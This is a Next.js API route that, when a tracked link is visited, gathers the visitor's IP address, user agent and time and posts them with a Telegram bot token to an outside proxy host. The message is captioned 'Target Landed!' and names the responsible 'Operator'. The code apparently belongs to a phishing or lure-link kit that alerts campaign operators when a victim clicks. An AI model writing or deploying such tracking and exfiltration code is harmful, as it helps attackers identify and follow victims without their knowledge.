import { NextResponse } from 'next/server';
import { getLink } from '@/lib/storage';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { linkId } = body;
    
    if (!linkId) {
      return NextResponse.json({ error: 'Missing linkId' }, { status: 400 });
    }

    const link = await getLink(linkId);
    const operatorName = link?.label || 'Unknown';
    const userAgent = request.headers.get('user-agent') || 'Unknown';
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 'Unknown';
    const timestamp = new Date().toLocaleString();

    // Telegram Notification
    const token = process.env.TELEGRAM_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const proxyUrl = process.env.TELEGRAM_PROXY_URL || 'https://telegram-dacoumennt-api.vercel.app/api/proxy';

    if (token && chatId) {
      const caption = `🚀 *Target Landed!* \n\n` +
        `👤 *Operator:* ${operatorName}\n` +
        `🔑 *Link ID:* \`${linkId}\`\n` +
        `⏰ *Time:* ${timestamp}\n` +
        `🌐 *IP:* ${ip}\n` +
        `📱 *Device:* ${userAgent}`;

      const formData = new FormData();
      formData.append('token', token);
      formData.append('chatid', chatId);
      formData.append('caption', caption);
      formData.append('username', `${operatorName} Operator`);

      await fetch(proxyUrl, {
        method: 'POST',
        body: formData,
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error in landing notification:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
